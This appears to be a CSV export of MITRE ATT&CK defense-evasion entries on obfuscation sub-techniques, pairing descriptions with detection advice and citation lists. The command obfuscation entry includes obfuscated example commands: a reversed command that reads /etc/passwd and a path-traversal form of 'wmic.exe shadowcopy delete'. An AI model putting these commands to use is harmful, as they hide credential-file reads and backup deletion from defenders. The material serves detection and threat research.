Binary padding effectively changes the checksum of the file and can also be used to avoid hash-based blocklists and static anti-virus signatures.(Citation: ESET OceanLotus) The padding used is commonly generated by a function to create junk data and then appended to the end or applied to sections of malware.(Citation: Securelist Malware Tricks April 2017) Increasing the file size may decrease the effectiveness of certain tools and detection capabilities that are not designed or configured to scan large files. This may also reduce the likelihood of being collected for analysis. Public file scanning services, such as VirusTotal, limits the maximum size of an uploaded file to be analyzed.(Citation: VirusTotal FAQ) ",https://attack.mitre.org/techniques/T1027/001,05 February 2020,30 March 2023,enterprise-attack,1.2,Defense Evasion,"Depending on the method used to pad files, a file-based signature may be capable of detecting padding using a scanning or on-access based tool.  When executed, the resulting process from padded files may also exhibit other behavior characteristics of being used to conduct an intrusion such as system and network information Discovery or Lateral Movement, which could be used as event indicators that point to the source file. ","Linux, Windows, macOS",File: File Metadata,True,T1027,"Anti-virus, Signature-based detection","Martin Jirkal, ESET",,,,,,"(Citation: Symantec Orangeworm April 2018),(Citation: FinFisher Citation),(Citation: Avira Mustang Panda January 2020),(Citation: Morphisec Snip3 May 2021),(Citation: McAfee Maze March 2020),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: Proofpoint ZeroT Feb 2017),(Citation: BlackBerry CostaRicto November 2020),(Citation: Emissary Trojan Feb 2016),(Citation: Microsoft FinFisher March 2018),(Citation: Trend Micro Tick November 2019),(Citation: TrendMicro POWERSTATS V3 June 2019),(Citation: Carbon Black HotCroissant April 2020),(Citation: FireEye APT28),(Citation: CISA MAR-10288834-2.v1  TAINTEDSCRIBE MAY 2020),(Citation: NCC Group WastedLocker June 2020),(Citation: Group IB Ransomware September 2020),(Citation: ESET Gelsemium June 2021),(Citation: Zscaler Higaisa 2020),(Citation: Sophos SamSam Apr 2018),(Citation: ESET OceanLotus Mar 2019),(Citation: Palo Alto Comnie),(Citation: ESET Grandoreiro April 2020),(Citation: Trend Micro Qakbot May 2020),(Citation: Proofpoint Leviathan Oct 2017),(Citation: ESET Gamaredon June 2020),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: ESET Sednit Part 2),(Citation: SentinelOne NobleBaron June 2021),(Citation: Haq 2014),(Citation: Group IB GrimAgent July 2021),(Citation: ESET Dukes October 2019),(Citation: Check Point Black Basta October 2022),(Citation: ESET OceanLotus),(Citation: Cybereason Cobalt Kitty 2017),(Citation: Mandiant FIN7 Apr 2022),(Citation: TrendMicro Patchwork Dec 2017),(Citation: Talos Bisonal Mar 2020),(Citation: ASERT Donot March 2018),"
T1027.010,attack-pattern--d511a6f6-4a33-41d5-bc95-c343875d1377,Obfuscated Files or Information: Command Obfuscation,"Adversaries may obfuscate content during command execution to impede detection. Command-line obfuscation is a method of making strings and patterns within commands and scripts more difficult to signature and analyze. This type of obfuscation can be included within commands executed by delivered payloads (e.g., [Phishing](https://attack.mitre.org/techniques/T1566) and [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)) or interactively via [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059).(Citation: Akamai JS)(Citation: Malware Monday VBE)

For example, adversaries may abuse syntax that utilizes various symbols and escape characters (such as spacing,  `^`, `+`. `$`, and `%`) to make commands difficult to analyze while maintaining the same intended functionality.(Citation: RC PowerShell) Many languages support built-in obfuscation in the form of base64 or URL encoding.(Citation: Microsoft PowerShellB64) Adversaries may also manually implement command obfuscation via string splitting (`“Wor”+“d.Application”`), order and casing of characters (`rev <<<'dwssap/cte/ tac'`), globing (`mkdir -p '/tmp/:&$NiA'`), as well as various tricks involving passing strings through tokens/environment variables/input streams.(Citation: Bashfuscator Command Obfuscators)(Citation: FireEye Obfuscation June 2017)

Adversaries may also use tricks such as directory traversals to obfuscate references to the binary being invoked by a command (`C:\voi\pcw\..\..\Windows\tei\qs\k\..\..\..\system32\erool\..\wbem\wg\je\..\..\wmic.exe shadowcopy delete`).(Citation: Twitter Richard WMIC)

Tools such as <code>Invoke-Obfuscation</code> and <code>Invoke-DOSfucation</code> have also been used to obfuscate commands.(Citation: Invoke-DOSfuscation)(Citation: Invoke-Obfuscation)",https://attack.mitre.org/techniques/T1027/010,14 March 2023,24 March 2023,enterprise-attack,1.0,Defense Evasion,,"Linux, Windows, macOS","Command: Command Execution, File: File Metadata, Script: Script Execution",True,T1027,,George Thomas; Tim Peck; TruKno,,,,,,"(Citation: CrowdStrike IceApple May 2022),(Citation: Talos Emotet Jan 2019),(Citation: Bitdefender Sardonic Aug 2021),(Citation: Trend Micro Muddy Water March 2021),(Citation: GitHub Invoke-Obfuscation),(Citation: Cybereason Astaroth Feb 2019),(Citation: Unit 42 BackConfig May 2020),(Citation: Unit 42 Magic Hound Feb 2017),(Citation: Microsoft Unidentified Dec 2018),(Citation: Unit 42 CARROTBAT November 2018),(Citation: Talos MuddyWater Jan 2022),(Citation: Morphisec Cobalt Gang Oct 2018),(Citation: FireEye Ryuk and Trickbot January 2019),(Citation: FireEye APT19),(Citation: Sophos Netwalker May 2020),(Citation: Talos Frankenstein June 2019),(Citation: Github PowerShell Empire),(Citation: Unit 42 DarkHydrus July 2018),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: ESET Turla PowerShell May 2019),(Citation: Talos Zeus Panda Nov 2017),(Citation: Microsoft Actinium February 2022),(Citation: ClearSky MuddyWater June 2019),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: Trend Micro Black Basta October 2022),(Citation: CrowdStrike AQUATIC PANDA December 2021),(Citation: Picus Emotet Dec 2018),(Citation: Flashpoint FIN 7 March 2019),(Citation: Cisco Talos Avos Jun 2022),(Citation: FireEye MuddyWater Mar 2018),(Citation: Cylance Machete Mar 2017),(Citation: Rewterz Sidewinder APT April 2020),(Citation: objsee mac malware 2017),(Citation: Cybereason Cobalt Kitty 2017),(Citation: Talos MuddyWater May 2019),(Citation: TrendMicro Patchwork Dec 2017),(Citation: FireEye FIN7 Aug 2018),(Citation: Deep Instinct TA505 Apr 2019),(Citation: ESET Machete July 2019),(Citation: Unit 42 QUADAGENT July 2018),(Citation: Cyberint Qakbot May 2021),(Citation: TrendMicro POWERSTATS V3 June 2019),(Citation: FoxIT Wocao December 2019),(Citation: Cycraft Chimera April 2020),(Citation: ClearSky MuddyWater Nov 2018),(Citation: PowerSploit Documentation),(Citation: Symantec Leafminer July 2018),(Citation: TrendMicro Netwalker May 2020),(Citation: Talos Cobalt Group July 2018),(Citation: Unit 42 MuddyWater Nov 2017),(Citation: Kaspersky Lyceum October 2021),(Citation: ESET Gamaredon June 2020),(Citation: ATT Sidewinder January 2021),(Citation: Bitdefender FIN8 July 2021),(Citation: Bromium Ursnif Mar 2017),(Citation: ESET Emotet Dec 2018),(Citation: Unit42 CookieMiner Jan 2019),(Citation: ESET ComRAT May 2020),(Citation: FireEye APT29 Nov 2018),(Citation: ESET LoudMiner June 2019),(Citation: CrowdStrike Carbon Spider August 2021),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: Cybereason TA505 April 2019),(Citation: Cyber Forensicator Silence Jan 2019),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Securelist MuddyWater Oct 2018),(Citation: GitHub PowerSploit May 2012),(Citation: Unit 42 Valak July 2020),(Citation: FireEye Obfuscation June 2017),(Citation: Microsoft Iranian Threat Actor Trends November 2021),(Citation: Tetra Defense Sodinokibi March 2020),(Citation: Talos PoetRAT October 2020),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: Costa AvosLocker May 2022),(Citation: DFIR Ryuk's Return October 2020),(Citation: Visa FIN6 Feb 2019),(Citation: FireEye APT32 May 2017),(Citation: CISA ComRAT Oct 2020),(Citation: ESET Telebots Dec 2016),(Citation: Prevailion DarkWatchman 2021),(Citation: Trend Micro Emotet Jan 2019),(Citation: BitDefender BADHATCH Mar 2021),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: Microsoft ASR Obfuscation)"
T1027.004,attack-pattern--c726e0a2-a57a-4b7b-a973-d0f013246617,Obfuscated Files or Information: Compile After Delivery,"Adversaries may attempt to make payloads difficult to discover and analyze by delivering files to victims as uncompiled code. Text-based source code files may subvert analysis and scrutiny from protections targeting executables/binaries. These payloads will need to be compiled before execution; typically via native utilities such as csc.exe or GCC/MinGW.(Citation: ClearSky MuddyWater Nov 2018)

Source code payloads may also be encrypted, encoded, and/or embedded within other files, such as those delivered as a [Phishing](https://attack.mitre.org/techniques/T1566). Payloads may also be delivered in formats unrecognizable and inherently benign to the native OS (ex: EXEs on macOS/Linux) before later being (re)compiled into a proper executable binary with a bundled compiler and execution framework.(Citation: TrendMicro WindowsAppMac)",https://attack.mitre.org/techniques/T1027/004,16 March 2020,29 March 2020,enterprise-attack,1.0,Defense Evasion,"Monitor the execution file paths and command-line arguments for common compilers, such as csc.exe and GCC/MinGW, and correlate with other suspicious behavior to reduce false positives from normal user and administrator behavior. The compilation of payloads may also generate file creation and/or file write events. Look for non-native binary formats and cross-platform compiler and execution frameworks like Mono and determine if they have a legitimate purpose on the system.(Citation: TrendMicro WindowsAppMac) Typically these should only be used in specific and limited cases, like for software development.","Linux, Windows, macOS","Command: Command Execution, File: File Creation, File: File Metadata, Process: Process Creation",True,T1027,"Anti-virus, Binary Analysis, Host intrusion prevention systems, Signature-based detection, Static File Analysis","Praetorian; Ye Yint Min Thu Htut, Offensive Security Team, DBS Bank",User,,Compiler software (either native to the system or delivered by the adversary),,,"(Citation: Prevailion DarkWatchman 2021),(Citation: ClearSky MuddyWater Nov 2018),(Citation: PaloAlto CardinalRat Apr 2017),(Citation: ESET Gamaredon June 2020),(Citation: Trend Micro njRAT 2018),(Citation: MSTIC FoggyWeb September 2021),(Citation: Anomali Rocke March 2019),"
T1027.007,attack-pattern--ea4c2f9c-9df1-477c-8c42-6da1118f2ac4,Obfuscated Files or Information: Dynamic API Resolution,"Adversaries may obfuscate then dynamically resolve API functions called by their malware in order to conceal malicious functionalities and impair defensive analysis. Malware commonly uses various [Native API](https://attack.mitre.org/techniques/T1106) functions provided by the OS to perform various tasks such as those involving processes, files, and other system artifacts.

API functions called by malware may leave static artifacts such as strings in payload files. Defensive analysts may also uncover which functions a binary file may execute via an import address table (IAT) or other structures that help dynamically link calling code to the shared modules that provide functions.(Citation: Huntress API Hash)(Citation: IRED API Hashing)

To avoid static or other defensive analysis, adversaries may use dynamic API resolution to conceal malware characteristics and functionalities. Similar to [Software Packing](https://attack.mitre.org/techniques/T1027/002), dynamic API resolution may change file signatures and obfuscate malicious API function calls until they are resolved and invoked during runtime.

Various methods may be used to obfuscate malware calls to API functions. For example, hashes of function names are commonly stored in malware in lieu of literal strings. Malware can use these hashes (or other identifiers) to manually reproduce the linking and loading process using functions such as `GetProcAddress()` and `LoadLibrary()`. These hashes/identifiers can also be further obfuscated using encryption or other string manipulation tricks (requiring various forms of [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) during execution).(Citation: BlackHat API Packers)(Citation: Drakonia HInvoke)(Citation: Huntress API Hash)",https://attack.mitre.org/techniques/T1027/007,22 August 2022,23 August 2022,enterprise-attack,1.0,Defense Evasion,,Windows,"File: File Metadata, Module: Module Load, Process: OS API Execution",True,T1027,,,,,,,,"(Citation: Microsoft Actinium February 2022),(Citation: Palo Alto Brute Ratel July 2022),(Citation: Cybereason Bazar July 2020),(Citation: Lazarus APT January 2022),(Citation: NCC Group Team9 June 2020),(Citation: Malwarebytes AvosLocker Jul 2021),"
T1027.009,attack-pattern--0533ab23-3f7d-463f-9bd8-634d27e4dee1,Obfuscated Files or Information: Embedded Payloads,"Adversaries may embed payloads within other files to conceal malicious content from defenses. Otherwise seemingly benign files (such as scripts and executables) may be abused to carry and obfuscate malicious payloads and content. In some cases, embedded payloads may also enable adversaries to [Subvert Trust Controls](https://attack.mitre.org/techniques/T1553) by not impacting execution controls such as digital signatures and notarization tickets.(Citation: Sentinel Labs) 

Adversaries may embed payloads in various file formats to hide payloads.(Citation: Microsoft Learn) This is similar to [Steganography](https://attack.mitre.org/techniques/T1027/003), though does not involve weaving malicious content into specific bytes and patterns related to legitimate digital media formats.(Citation: GitHub PSImage) 

For example, adversaries have been observed embedding payloads within or as an overlay of an otherwise benign binary.(Citation: Securelist Dtrack2) Adversaries have also been observed nesting payloads (such as executables and run-only scripts) inside a file of the same format.(Citation: SentinelLabs reversing run-only applescripts 2021) 

Embedded content may also be used as [Process Injection](https://attack.mitre.org/techniques/T1055) payloads used to infect benign system processes.(Citation: Trend Micro) These embedded then injected payloads may be used as part of the modules of malware designed to provide specific features such as encrypting C2 communications in support of an orchestrator module. For example, an embedded module may be injected into default browsers, allowing adversaries to then communicate via the network.(Citation: Malware Analysis Report ComRAT)",https://attack.mitre.org/techniques/T1027/009,30 September 2022,29 September 2023,enterprise-attack,1.1,Defense Evasion,,"Linux, Windows, macOS","File: File Creation, File: File Metadata",True,T1027,,"Nick Cairns, @grotezinfosec",,,User,,,"(Citation: FireEye SMOKEDHAM June 2021),(Citation: Binary Defense Emotes Wi-Fi Spreader),(Citation: Microsoft Unidentified Dec 2018),(Citation: Joint Cybersecurity Advisory AA23-129A Snake Malware May 2023),(Citation: ESET ComRAT May 2020),(Citation: Gigamon BADHATCH Jul 2019),(Citation: Securelist Dtrack),(Citation: Mandiant APT41),(Citation: CISA ComRAT Oct 2020),(Citation: GitHub PSImage),(Citation: TrendMicro Netwalker May 2020),(Citation: SentinelLabs reversing run-only applescripts 2021),(Citation: win10_asr)"
T1027.011,attack-pattern--02c5abff-30bf-4703-ab92-1f6072fae939,Obfuscated Files or Information: Fileless Storage,"Adversaries may store data in ""fileless"" formats to conceal malicious activity from defenses. Fileless storage can be broadly defined as any format other than a file. Common examples of non-volatile fileless storage include the Windows Registry, event logs, or WMI repository.(Citation: Microsoft Fileless)(Citation: SecureList Fileless)

Similar to fileless in-memory behaviors such as [Reflective Code Loading](https://attack.mitre.org/techniques/T1620) and [Process Injection](https://attack.mitre.org/techniques/T1055), fileless data storage may remain undetected by anti-virus and other endpoint security tools that can only access specific file formats from disk storage.

Adversaries may use fileless storage to conceal various types of stored data, including payloads/shellcode (potentially being used as part of [Persistence](https://attack.mitre.org/tactics/TA0003)) and collected data not yet exfiltrated from the victim (e.g., [Local Data Staging](https://attack.mitre.org/techniques/T1074/001)). Adversaries also often encrypt, encode, splice, or otherwise obfuscate this fileless data when stored.

Some forms of fileless storage activity may indirectly create artifacts in the file system, but in central and otherwise difficult to inspect formats such as the WMI (e.g., `%SystemRoot%\System32\Wbem\Repository`) or Registry (e.g., `%SystemRoot%\System32\Config`) physical files.(Citation: Microsoft Fileless) ",https://attack.mitre.org/techniques/T1027/011,23 March 2023,04 May 2023,enterprise-attack,1.0,Defense Evasion,,Windows,"WMI: WMI Creation, Windows Registry: Windows Registry Key Creation",True,T1027,,Christopher Peacock; Denise Tan; Mark Wee; Simona David; Xavier Rousseau,,,,,,"(Citation: Cybereason Chaes Nov 2020),(Citation: Kaspersky ShadowPad Aug 2017),(Citation: Talos TinyTurla September 2021),(Citation: Trend Micro DRBControl February 2020),(Citation: Secureworks GandCrab and REvil September 2019),(Citation: Trend Micro Iron Tiger April 2021),(Citation: ESET TeleBots Oct 2018),(Citation: Unit 42 QUADAGENT July 2018),(Citation: SentinelOne Valak June 2020),(Citation: Secureworks REvil September 2019),(Citation: Red Canary NETWIRE January 2020),(Citation: FireEye APT28),(Citation: Joint Cybersecurity Advisory AA23-129A Snake Malware May 2023),(Citation: Unit 42 Valak July 2020),(Citation: Group IB Ransomware September 2020),(Citation: ESET Gelsemium June 2021),(Citation: Symantec Waterbug Jun 2019),(Citation: Intel 471 REvil March 2020),(Citation: US-CERT Volgmer Nov 2017),(Citation: ESET OceanLotus Mar 2019),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: ESET Grandoreiro April 2020),(Citation: Symantec Volgmer Aug 2014),(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: TrendMicro EarthLusca 2022),(Citation: Cybereason Valak May 2020),(Citation: US-CERT TYPEFRAME June 2018),(Citation: CISA ComRAT Oct 2020),(Citation: ESET Dukes October 2019),(Citation: Profero APT27 December 2020),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: ESET Turla PowerShell May 2019),(Citation: ESET PipeMon May 2020),(Citation: ESET ComRAT May 2020),(Citation: Prevailion DarkWatchman 2021),(Citation: Red Canary Qbot),(Citation: ESET Turla Mosquito Jan 2018),(Citation: Trustwave Pillowmint June 2020),(Citation: McAfee Sodinokibi October 2019),(Citation: Cylance Sodinokibi July 2019),"
T1027.006,attack-pattern--d4dc46e3-5ba5-45b9-8204-010867cacfcb,Obfuscated Files or Information: HTML Smuggling,"Adversaries may smuggle data and files past content filters by hiding malicious payloads inside of seemingly benign HTML files. HTML documents can store large binary objects known as JavaScript Blobs (immutable data that represents raw bytes) that can later be constructed into file-like objects. Data may also be stored in Data URLs, which enable embedding media type or MIME files inline of HTML documents. HTML5 also introduced a download attribute that may be used to initiate file downloads.(Citation: HTML Smuggling Menlo Security 2020)(Citation: Outlflank HTML Smuggling 2018)

Adversaries may deliver payloads to victims that bypass security controls through HTML Smuggling by abusing JavaScript Blobs and/or HTML5 download attributes. Security controls such as web content filters may not identify smuggled malicious files inside of HTML/JS files, as the content may be based on typically benign MIME types such as <code>text/plain</code> and/or <code>text/html</code>. Malicious files or data can be obfuscated and hidden inside of HTML files through Data URLs and/or JavaScript Blobs and can be deobfuscated when they reach the victim (i.e. [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140)), potentially bypassing content filters.

For example, JavaScript Blobs can be abused to dynamically generate malicious files in the victim machine and may be dropped to disk by abusing JavaScript functions such as <code>msSaveBlob</code>.(Citation: HTML Smuggling Menlo Security 2020)(Citation: MSTIC NOBELIUM May 2021)(Citation: Outlflank HTML Smuggling 2018)(Citation: nccgroup Smuggling HTA 2017)",https://attack.mitre.org/techniques/T1027/006,20 May 2021,14 July 2023,enterprise-attack,1.1,Defense Evasion,"Detection of HTML Smuggling is difficult as HTML5 and JavaScript attributes are used by legitimate services and applications. HTML Smuggling can be performed in many ways via JavaScript, developing rules for the different variants, with a combination of different encoding and/or encryption schemes, may be very challenging.(Citation: Outlflank HTML Smuggling 2018) Detecting specific JavaScript and/or HTML5 attribute strings such as <code>Blob</code>, <code>msSaveOrOpenBlob</code>, and/or <code>download</code> may be a good indicator of HTML Smuggling. These strings may also be used by legitimate services therefore it is possible to raise false positives.

Consider monitoring files downloaded from the Internet, possibly by HTML Smuggling, for suspicious activities. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities.","Linux, Windows, macOS",File: File Creation,True,T1027,"Anti-virus, Static File Analysis, Web Content Filters","Jonathan Boucher, @crash_wave, Bank of Canada; Krishnan Subramanian, @krish203; Stan Hegt, Outflank; Vinay Pidathala",,,,,,"(Citation: Deep Instinct Black Basta August 2022),(Citation: MSTIC Nobelium Toolset May 2021),(Citation: Trend Micro Black Basta October 2022),(Citation: ESET T3 Threat Report 2021),"
T1027.005,attack-pattern--b0533c6e-8fea-4788-874f-b799cacc4b92,Obfuscated Files or Information: Indicator Removal from Tools,"Adversaries may remove indicators from tools if they believe their malicious tool was detected, quarantined, or otherwise curtailed. They can modify the tool by removing the indicator and using the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems.

A good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may modify the file to explicitly avoid that signature, and then re-use the malware.",https://attack.mitre.org/techniques/T1027/005,19 March 2020,28 April 2022,enterprise-attack,1.1,Defense Evasion,"The first detection of a malicious tool may trigger an anti-virus or other security tool alert. Similar events may also occur at the boundary through network IDS, email scanning appliance, etc. The initial detection should be treated as an indication of a potentially more invasive intrusion. The alerting system should be thoroughly investigated beyond that initial alert for activity that was not detected. Adversaries may continue with an operation, assuming that individual events like an anti-virus detect will not be investigated or that an analyst will not be able to conclusively link that event to other activity occurring on the network.","Linux, Windows, macOS",Application Log: Application Log Content,True,T1027,"Anti-virus, Host intrusion prevention systems, Log analysis, Signature-based detection",,,,,,,"(Citation: GitHub PowerSploit May 2012),(Citation: Cyberint Qakbot May 2021),(Citation: Trend Micro Waterbear December 2019),(Citation: FoxIT Wocao December 2019),(Citation: Unit42 OilRig Nov 2018),(Citation: APT3 Adversary Emulation Plan),(Citation: PowerSploit Documentation),(Citation: CrowdStrike SUNSPOT Implant January 2021),(Citation: Crowdstrike Qakbot October 2020),(Citation: Leonardo Turla Penquin May 2020),(Citation: Cybereason Soft Cell June 2019),(Citation: ESET Gazer Aug 2017),(Citation: Symantec Black Vine),(Citation: FireEye TEMP.Veles 2018),(Citation: Palo Alto OilRig April 2017),(Citation: ESET InvisiMole June 2020),(Citation: Talos GravityRAT),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: TrendMicro Patchwork Dec 2017),(Citation: cobaltstrike manual),(Citation: Trend Micro Daserf Nov 2017),"
T1027.012,attack-pattern--887274fc-2d63-4bdc-82f3-fae56d1d5fdc,Obfuscated Files or Information: LNK Icon Smuggling,"Adversaries may smuggle commands to download malicious payloads past content filters by hiding them within otherwise seemingly benign windows shortcut files. Windows shortcut files (.LNK) include many metadata fields, including an icon location field (also known as the `IconEnvironmentDataBlock`) designed to specify the path to an icon file that is to be displayed for the LNK file within a host directory. 

Adversaries may abuse this LNK metadata to download malicious payloads. For example, adversaries have been observed using LNK files as phishing payloads to deliver malware. Once invoked (e.g., [Malicious File](https://attack.mitre.org/techniques/T1204/002)), payloads referenced via external URLs within the LNK icon location field may be downloaded. These files may also then be invoked by [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)/[System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218) arguments within the target path field of the LNK.(Citation: Unprotect Shortcut)(Citation: Booby Trap Shortcut 2017)

LNK Icon Smuggling may also be utilized post compromise, such as malicious scripts executing an LNK on an infected host to download additional malicious payloads. 
",https://attack.mitre.org/techniques/T1027/012,29 September 2023,17 October 2023,enterprise-attack,1.0,Defense Evasion,"
",Windows,"File: File Creation, File: File Metadata",True,T1027,,"Andrew Northern, @ex_raritas; Gregory Lesnewich, @greglesnewich; Michael Raggi @aRtAGGI",,,,,,","
T1027.002,attack-pattern--deb98323-e13f-4b0c-8d94-175379069062,Obfuscated Files or Information: Software Packing,"Adversaries may perform software packing or virtual machine software protection to conceal their code. Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code.(Citation: ESET FinFisher Jan 2018) 

Utilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.(Citation: Awesome Executable Packing)  ",https://attack.mitre.org/techniques/T1027/002,05 February 2020,30 March 2023,enterprise-attack,1.2,Defense Evasion,"Use file scanning to look for known software packers or artifacts of packing techniques. Packing is not a definitive indicator of malicious activity, because legitimate software may use packing techniques to reduce binary size or to protect proprietary code.","Linux, Windows, macOS",File: File Metadata,True,T1027,"Anti-virus, Heuristic detection, Signature-based detection","Filip Kafka, ESET",,,,,,"(Citation: FinFisher Citation),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: SentinelOne Valak June 2020),(Citation: Cybereason Astaroth Feb 2019),(Citation: FireEye Clandestine Wolf),(Citation: FireEye SUNSHUTTLE Mar 2021),(Citation: Red Canary NETWIRE January 2020),(Citation: Accenture SNAKEMACKEREL Nov 2018),(Citation: Mcafee Clop Aug 2019),(Citation: Unit 42 Lucifer June 2020),(Citation: Infoblox Lokibot January 2019),(Citation: Cyble Egregor Oct 2020),(Citation: Unit 42 Rocke January 2019),(Citation: Zscaler Bazar September 2020),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: McAfee Lazarus Nov 2020),(Citation: Mandiant APT41),(Citation: Malwarebytes KONNI Evolves Jan 2022),(Citation: Unit 42 Hildegard Malware),(Citation: ESET Dukes October 2019),(Citation: Unit 42 SeaDuke 2015),(Citation: Kaspersky Adwind Feb 2016),(Citation: Cylance Shaheen Nov 2018),(Citation: Lunghi Iron Tiger Linux),(Citation: Fortinet Metamorfo Feb 2020),(Citation: Talos Bisonal Mar 2020),(Citation: ASERT Donot March 2018),(Citation: Malwarebytes Kimsuky June 2021),(Citation: Trend Micro Iron Tiger April 2021),(Citation: Dragos Crashoverride 2018),(Citation: ESET OceanLotus macOS April 2019),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: Check Point APT31 February 2021),(Citation: Joint Cybersecurity Advisory AA23-129A Snake Malware May 2023),(Citation: ZScaler Squirrelwaffle Sep 2021),(Citation: Sogeti CERT ESEC Babuk March 2021),(Citation: Anomali Rocke March 2019),(Citation: Cybereason Clop Dec 2020),(Citation: Symantec Elderwood Sept 2012),(Citation: McAfee Cuba April 2021),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: McAfee Lazarus Jul 2020),(Citation: Talos Rocke August 2018),(Citation: Cylance Dust Storm),(Citation: FOX-IT May 2016 Mofang),(Citation: BitDefender Chafer May 2020),(Citation: Malwarebytes Saint Bot April 2021),(Citation: Symantec Waterbug),(Citation: Securelist APT10 March 2021),(Citation: Trend Micro Daserf Nov 2017),(Citation: Kaspersky Tomiris Sep 2021),(Citation: ESET Machete July 2019),(Citation: ESET GreyEnergy Oct 2018),(Citation: Malwarebytes Dyreza November 2015),(Citation: Cyberint Qakbot May 2021),(Citation: Secureworks Karagany July 2019),(Citation: MoustachedBouncer ESET August 2023),(Citation: NHS Digital Egregor Nov 2020),(Citation: Symantec RAINDROP January 2021),(Citation: APT3 Adversary Emulation Plan),(Citation: Lookout Dark Caracal Jan 2018),(Citation: Cyberreason Anchor December 2019),(Citation: Unit42 Sofacy Dec 2018),(Citation: Cybereason Soft Cell June 2019),(Citation: Unit42 Molerat Mar 2020),(Citation: Trend Micro TeamTNT),(Citation: Juniper IcedID June 2020),(Citation: Cybereason Bazar July 2020),(Citation: ESET Operation Spalax Jan 2021),(Citation: Cisco H1N1 Part 1),(Citation: Medium Babuk February 2021),(Citation: McAfee Night Dragon),(Citation: Donut Github),(Citation: Mandiant No Easy Breach),(Citation: Trend Micro DRBControl February 2020),(Citation: Unit 42 OopsIE! Feb 2018),(Citation: Proofpoint ZeroT Feb 2017),(Citation: FireEye APT39 Jan 2019),(Citation: BlackBerry CostaRicto November 2020),(Citation: Carbon Black HotCroissant April 2020),(Citation: Cybereason Kimsuky November 2020),(Citation: Lee 2013),(Citation: ClearSky Lazarus Aug 2020),(Citation: FireEye APT38 Oct 2018),(Citation: US-CERT BLINDINGCAN Aug 2020),(Citation: Cisco Operation Layover September 2021),(Citation: Securelist BlackOasis Oct 2017),(Citation: McAfee Babuk February 2021),(Citation: S2 Grupo TrickBot June 2017),(Citation: Securelist Dropping Elephant),(Citation: Unit 42 VERMIN Jan 2018),(Citation: hexed osx.dok analysis 2019),(Citation: Trend Micro Emotet Jan 2019),(Citation: Netskope Squirrelwaffle Oct 2021),(Citation: IBM TA505 April 2020),(Citation: Malwarebytes DarkComet March 2018),(Citation: Symantec Dragonfly),"
T1027.003,attack-pattern--c2e147a9-d1a8-4074-811a-d8789202d916,Obfuscated Files or Information: Steganography,"Adversaries may use steganography techniques in order to prevent the detection of hidden information. Steganographic techniques can be used to hide data in digital media such as images, audio tracks, video clips, or text files.

[Duqu](https://attack.mitre.org/software/S0038) was an early example of malware that used steganography. It encrypted the gathered information from a victim's system and hid it within an image before exfiltrating the image to a C2 server.(Citation: Wikipedia Duqu) 

By the end of 2017, a threat group used <code>Invoke-PSImage</code> to hide [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands in an image file (.png) and execute the code on a victim's system. In this particular case the [PowerShell](https://attack.mitre.org/techniques/T1059/001) code downloaded another obfuscated script to gather intelligence from the victim's machine and communicate it back to the adversary.(Citation: McAfee Malicious Doc Targets Pyeongchang Olympics)  ",https://attack.mitre.org/techniques/T1027/003,05 February 2020,30 March 2023,enterprise-attack,1.2,Defense Evasion,Detection of steganography is difficult unless artifacts are left behind by the obfuscation process that are detectable with a known signature. Look for strings or other signatures left in system artifacts related to decoding steganography.,"Linux, Windows, macOS",File: File Metadata,True,T1027,,,,,,,,"(Citation: Antiy CERT Ramsay April 2020),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: Fortinet Diavol July 2021),(Citation: Volexity PowerDuke November 2016),(Citation: Symantec RAINDROP January 2021),(Citation: Trend Micro Tick November 2019),(Citation: Talos Group123),(Citation: ESET Okrum July 2019),(Citation: Group IB Ransomware September 2020),(Citation: ClearSky MuddyWater Nov 2018),(Citation: Unit42 RDAT July 2020),(Citation: CISA AA21-200A APT40 July 2021),(Citation: GitHub Invoke-PSImage),(Citation: MalwareBytes Lazarus-Andariel Conceals Code April 2021),(Citation: TrendMicro EarthLusca 2022),(Citation: Juniper IcedID June 2020),(Citation: Securelist ScarCruft May 2019),(Citation: ESET Dukes October 2019),(Citation: Kaspersky Andariel Ransomware June 2021),(Citation: Unit 42 TA551 Jan 2021),(Citation: ESET Operation Spalax Jan 2021),(Citation: Talos Oblique RAT March 2021),(Citation: CheckPoint Bandook Nov 2020),"
